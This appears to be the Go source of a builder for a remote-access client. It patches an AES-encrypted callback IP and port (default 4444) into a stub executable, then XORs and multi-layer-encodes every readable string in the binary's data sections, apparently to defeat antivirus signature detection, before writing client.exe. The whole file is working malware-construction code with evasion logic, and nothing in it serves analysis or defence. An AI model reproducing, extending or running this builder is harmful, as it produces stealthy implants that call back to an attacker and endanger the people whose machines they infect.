package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	"encoding/ascii85"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"math/rand"
	"os"
	"strings"
	"time"
)

const (
	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV  = "A1B2C3D4E5F6A7B8"
)

var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

type Config struct {
	IP   string `json:"ip"`
	Port int    `json:"port"`
}

func main() {
	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	flag.Parse()

	args := flag.Args()
	if len(args) >= 1 { *ip = args[0] }
	if len(args) >= 2 { fmt.Sscanf(args[1], "%d", port) }

	fmt.Printf("[+] Building client for %s:%d\n", *ip, *port)

	stubPath := "stub.exe"
	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
		stubPath = "client/client_c.exe"
		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found.")
		}
	}

	data, err := ioutil.ReadFile(stubPath)
	if err != nil { log.Fatalf("[-] Error reading stub: %v", err) }

	var indices []int
	searchData := data
	offset := 0
	for {
		idx := bytes.Index(searchData, marker)
		if idx == -1 { break }
		indices = append(indices, offset+idx)
		searchData = searchData[idx+1:]
		offset += idx + 1
	}

	if len(indices) == 0 { log.Fatalf("[-] Error: Configuration marker not found.") }

	targetIndex := -1
	if len(indices) == 1 {
		targetIndex = indices[0]
	} else {
		maxZeros := -1
		for _, idx := range indices {
			scanLimit := 2032
			if idx+len(marker)+scanLimit > len(data) { scanLimit = len(data) - (idx + len(marker)) }
			if scanLimit <= 0 { continue }
			zeros := 0
			for i := 0; i < scanLimit; i++ {
				if data[idx+len(marker)+i] == 0 { zeros++ }
			}
			if zeros > maxZeros { maxZeros = zeros; targetIndex = idx }
		}
	}

	capacity := 0
	for i := targetIndex + len(marker); i < len(data); i++ {
		if data[i] != 0 { break }
		capacity++
	}
	fmt.Printf("[+] Found placeholder at 0x%X (Capacity: %d bytes)\n", targetIndex, capacity)

	config := Config{IP: *ip, Port: *port}
	configBytes, _ := json.Marshal(config)
	encryptedConfig := encrypt(configBytes)

	finalPayload := make([]byte, 2032)
	copy(finalPayload, encryptedConfig)

	patchedData := make([]byte, len(data))
	copy(patchedData, data)
	copy(patchedData[targetIndex+len(marker):], finalPayload)

	// --- Automated Obfuscation Logic ---
	rand.Seed(time.Now().UnixNano())
	xorKey := byte(rand.Intn(254) + 1)

	xorKeyMarker := []byte{0xAA, 0xBB, 0xCC, 0xDD}
	keyIdx := bytes.Index(patchedData, xorKeyMarker)
	if keyIdx != -1 {
		patchedData[keyIdx+4] = xorKey
		fmt.Printf("[+] Patched XOR key: 0x%02X\n", xorKey)
	}

	type StringEntry struct {
		RVA       uint32
		OrigLen   uint32
		ResOffset uint32
		StepCount int32
		Steps     [16]byte
	}
	var stringTable []StringEntry
	var encodedDataPool []byte

	f, err := pe.Open(stubPath)
	if err == nil {
		defer f.Close()
		var importRVA, importSize uint32
		if oh64, ok := f.OptionalHeader.(*pe.OptionalHeader64); ok {
			importRVA = oh64.DataDirectory[1].VirtualAddress
			importSize = oh64.DataDirectory[1].Size
		} else if oh32, ok := f.OptionalHeader.(*pe.OptionalHeader32); ok {
			importRVA = oh32.DataDirectory[1].VirtualAddress
			importSize = oh32.DataDirectory[1].Size
		}

		for _, sec := range f.Sections {
			if strings.Contains(sec.Name, ".rdata") || strings.Contains(sec.Name, ".data") {
				fmt.Printf("[*] Scanning section %s...\n", sec.Name)
				start, end := sec.Offset, sec.Offset+sec.Size
				sectionData := patchedData[start:end]
				for i := 0; i < len(sectionData); {
					if isPrintable(sectionData[i]) {
						j := i
						for j < len(sectionData) && isPrintable(sectionData[j]) { j++ }
						length := j - i
						if length >= 4 && j < len(sectionData) && sectionData[j] == 0 {
							rva := sec.VirtualAddress + uint32(i)
							if rva >= importRVA && rva < importRVA+importSize { i = j + 1; continue }
							if start+uint32(i) >= uint32(targetIndex) && start+uint32(i) < uint32(targetIndex+len(marker)+capacity) { i = j + 1; continue }

							isMarker := bytes.Contains(sectionData[i:j], marker) || bytes.Contains(sectionData[i:j], xorKeyMarker)
							if !isMarker {
								origString := make([]byte, length)
								copy(origString, sectionData[i:j])
								encoded, steps := multiStepEncode(origString, xorKey)

								entry := StringEntry{
									RVA:       rva,
									OrigLen:   uint32(length),
									ResOffset: uint32(len(encodedDataPool)),
									StepCount: int32(len(steps)),
								}
								copy(entry.Steps[:], steps)
								stringTable = append(stringTable, entry)

								// XOR original location
								for k := 0; k < length; k++ {
									patchedData[start+uint32(i)+uint32(k)] ^= xorKey
								}

								// Store encoded version in pool
								encLenBuf := make([]byte, 4)
								binary.LittleEndian.PutUint32(encLenBuf, uint32(len(encoded)))
								encodedDataPool = append(encodedDataPool, encLenBuf...)
								encodedDataPool = append(encodedDataPool, encoded...)
							}
							i = j + 1
						} else { i++ }
					} else { i++ }
				}
			}
		}
	}

	tableStart := targetIndex + len(marker) + 2032
	numEntries := len(stringTable)
	if numEntries > 10000 { numEntries = 10000 }

	binary.LittleEndian.PutUint32(patchedData[tableStart:tableStart+4], uint32(numEntries))
	poolStartOffset := uint32(4 + numEntries*32)

	for i := 0; i < numEntries; i++ {
		entry := stringTable[i]
		entry.ResOffset += poolStartOffset
		entryOffset := tableStart + 4 + i*32
		binary.LittleEndian.PutUint32(patchedData[entryOffset:entryOffset+4], entry.RVA)
		binary.LittleEndian.PutUint32(patchedData[entryOffset+4:entryOffset+8], entry.OrigLen)
		binary.LittleEndian.PutUint32(patchedData[entryOffset+8:entryOffset+12], entry.ResOffset)
		binary.LittleEndian.PutUint32(patchedData[entryOffset+12:entryOffset+16], uint32(entry.StepCount))
		copy(patchedData[entryOffset+16:entryOffset+32], entry.Steps[:])
	}

	copy(patchedData[tableStart+4+numEntries*32:], encodedDataPool)
	fmt.Printf("[+] Obfuscated %d strings. Total Table+Pool: %d bytes\n", numEntries, 4 + numEntries*32 + len(encodedDataPool))

	err = ioutil.WriteFile("client.exe", patchedData, 0755)
	if err != nil { log.Fatalf("[-] Error writing client.exe: %v", err) }
	fmt.Println("[+] Successfully built client.exe")
}

func isPrintable(b byte) bool {
	return (b >= 32 && b <= 126) || b == 10 || b == 13
}

const (
	StepXOR = 0
	StepB64 = 1
	StepB32 = 2
	StepB16 = 3
	StepB58 = 4
	StepB62 = 5
	StepB85 = 6
	StepB91 = 7
)

func multiStepEncode(data []byte, xorKey byte) ([]byte, []byte) {
	steps := []byte{StepXOR}
	current := make([]byte, len(data))
	copy(current, data)
	for i := range current { current[i] ^= xorKey }

	numBases := rand.Intn(3) + 1
	for i := 0; i < numBases; i++ {
		baseType := byte(rand.Intn(7) + 1)
		var next []byte
		switch baseType {
		case StepB64: next = []byte(base64.StdEncoding.EncodeToString(current))
		case StepB32: next = []byte(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(current))
		case StepB16: next = []byte(strings.ToUpper(hex.EncodeToString(current)))
		case StepB58: next = []byte(base58Encode(current))
		case StepB62: next = []byte(base62Encode(current))
		case StepB85:
			buf := make([]byte, ascii85.MaxEncodedLen(len(current)))
			n := ascii85.Encode(buf, current)
			next = buf[:n]
		case StepB91: next = []byte(base91Encode(current))
		}
		if len(next) > 0 && len(next) <= 32768 {
			current = next
			steps = append(steps, baseType)
		}
	}
	for i := range current { current[i] ^= xorKey }
	steps = append(steps, StepXOR)
	return current, steps
}

func base58Encode(input []byte) string {
	return baseNEncode(input, "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", 58)
}

func base62Encode(input []byte) string {
	return baseNEncode(input, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", 62)
}

func baseNEncode(input []byte, alphabet string, base int) string {
	if len(input) == 0 { return "" }
	n := new(big.Int).SetBytes(input)
	b := big.NewInt(int64(base))
	var res []byte
	for n.Cmp(big.NewInt(0)) > 0 {
		var m big.Int
		n.QuoRem(n, b, &m)
		res = append(res, alphabet[m.Int64()])
	}
	for _, v := range input {
		if v != 0 { break }
		res = append(res, alphabet[0])
	}
	for i, j := 0, len(res)-1; i < j; i, j = i+1, j-1 { res[i], res[j] = res[j], res[i] }
	return string(res)
}

func base91Encode(input []byte) string {
	alphabet := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\""
	var res []byte
	var b, n uint32
	for _, v := range input {
		b |= uint32(v) << n
		n += 8
		if n >= 13 {
			v := b & 8191
			if v > 88 { b >>= 13; n -= 13 } else { v = b & 16383; b >>= 14; n -= 14 }
			res = append(res, alphabet[v%91], alphabet[v/91])
		}
	}
	if n > 0 {
		res = append(res, alphabet[b%91])
		if n > 7 || b > 90 { res = append(res, alphabet[b/91]) }
	}
	return string(res)
}

func encrypt(plaintext []byte) []byte {
	block, _ := aes.NewCipher([]byte(ConfigKey))
	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
	if padding == 0 { padding = aes.BlockSize }
	padtext := bytes.Repeat([]byte{0}, padding)
	plaintext = append(plaintext, padtext...)
	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, []byte(ConfigIV))
	mode.CryptBlocks(ciphertext, plaintext)
	return ciphertext
}
